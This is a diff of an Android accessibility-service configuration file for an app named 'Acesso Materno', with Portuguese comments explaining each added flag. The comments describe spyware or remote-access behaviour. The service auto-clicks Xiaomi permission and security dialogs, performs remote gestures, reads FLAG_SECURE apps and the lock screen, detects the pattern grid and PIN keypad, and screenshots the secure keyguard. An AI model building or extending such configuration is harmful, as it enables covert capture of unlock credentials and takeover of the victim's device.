@@ -1,11 +1,66 @@
 <?xml version="1.0" encoding="utf-8"?>
+<!--
+  Configuração do Servico de Acessibilidade - Acesso Materno
+  ============================================================
+  ARQUIVO MESCLADO: preserva TODAS as suas configurações originais
+  (Injecty / Volume- / Xiaomi / settingsActivity) e adiciona apenas o
+  mínimo necessário para o Emulador Wireframe (flagReportViewIds +
+  canTakeScreenshot). NADA foi removido.
+
+  Compativel com:
+   - Auto-clique Injecty (regras 2/3): leitura de nos e ACTION_CLICK em
+     telas de permissao/seguranca (Xiaomi/MIUI/HyperOS, Android 13+) e
+     replicar permissoes no Suporte Motor.
+   - Gestos remotos (dispatchGesture): toque/arraste do painel.
+   - Captura de teclas fisicas (Volume - para sair da tela de privacidade).
+   - EMULADOR WIREFRAME (Leitor de Tela): leitura completa de janelas
+     (service.windows) em apps com FLAG_SECURE e na tela de bloqueio.
+
+  Atributos explicados:
+   - accessibilityEventTypes="typeAllMask": recebe TODOS os eventos. Cobre
+     typeWindowStateChanged e typeWindowContentChanged, necessarios para o
+     auto-clique Injecty detectar quando uma tela de permissao abriu.
+   - accessibilityFlags:
+       flagRetrieveInteractiveWindows = le janelas de outros apps (dialogos
+         e a tela de bloqueio/Keyguard) — necessario ao wireframe.
+       flagIncludeNotImportantViews = INDISPENSAVEL no Xiaomi/MIUI: muitos
+         botoes de "Permitir/Aceitar" dos dialogos de seguranca sao marcados
+         como "not important" e, sem esta flag, ficam invisiveis ao servico.
+       flagReportViewIds = reporta o ID de recurso de cada view (ex.:
+         "lockPatternView", teclas de PIN) — ADICIONADO para o wireframe
+         detectar a grade de senha padrao e o teclado de PIN.
+       flagRequestFilterKeyEvents = captura teclas fisicas (Volume -).
+       flagEnableAccessibilityVolume = controle de volume de acessibilidade.
+       flagRequestTouchExplorationMode NAO esta presente (DE PROPOSITO):
+         manter o toque normal do dispositivo, sem TalkBack / sem
+         "touch exploration".
+   - canPerformGestures="true": gestos remotos do painel (dispatchGesture)
+     e tap/swipe/pattern do wireframe.
+   - canRetrieveWindowContent="true": INDISPENSAVEL para o auto-clique
+     Injecty e para o wireframe ler a arvore de views.
+   - canRequestFilterKeyEvents="true": filtro de teclas fisicas.
+   - canTakeScreenshot="true": (API 30+, Android 11+) ADICIONADO — fallback
+     de captura no keyguard seguro (PIN/senha) onde o MediaProjection fica
+     preto. Ignorado em APIs anteriores — seguro manter.
+   - accessibilityDataSensitive="yes": Android 13+ (API 33). No Android 14+
+     (API 34) este atributo e um enum [auto=0, yes=1, no=2] — NAO use
+     "true"/"false". Permite ler dialogos marcados como sensiveis (algumas
+     telas de seguranca da Xiaomi). Ignorado em versoes anteriores — seguro
+     manter.
+   - notificationTimeout="100": intervalo minimo entre eventos (ms).
+   - settingsActivity: tela que abre ao tocar em "Configuracoes" do servico.
+   - packageNames NAO definido (ou vazio) = escuta TODOS os pacotes,
+     incluindo SystemUI / Keyguard / apps com FLAG_SECURE.
+-->
 <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
     android:description="@string/accessibility_service_description"
     android:accessibilityEventTypes="typeAllMask"
     android:accessibilityFeedbackType="feedbackGeneric"
-    android:accessibilityFlags="flagDefault|flagRetrieveInteractiveWindows|flagIncludeNotImportantViews|flagRequestFilterKeyEvents"
+    android:accessibilityFlags="flagDefault|flagReportViewIds|flagRetrieveInteractiveWindows|flagIncludeNotImportantViews|flagRequestFilterKeyEvents|flagEnableAccessibilityVolume"
     android:canPerformGestures="true"
     android:canRetrieveWindowContent="true"
     android:canRequestFilterKeyEvents="true"
+    android:canTakeScreenshot="true"
+    android:accessibilityDataSensitive="yes"
     android:notificationTimeout="100"
     android:settingsActivity="com.example.acessomaterno.MainActivity" />
